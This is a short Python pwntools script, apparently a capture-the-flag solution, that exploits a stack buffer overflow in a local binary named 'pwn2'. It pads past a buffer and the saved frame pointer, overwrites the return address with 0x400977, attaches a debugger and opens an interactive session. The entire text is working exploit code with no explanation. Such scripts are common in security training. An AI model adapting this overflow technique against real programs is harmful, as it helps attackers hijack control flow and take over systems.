from pwn import *

p = process('./pwn2')

payload = 'a'*0x20 + 'b'*8 + p64(0x400977)
gdb.attach(p,'b *0x400a96')
p.recvuntil('check?\n> ')
p.sendline(payload)

p.interactive()
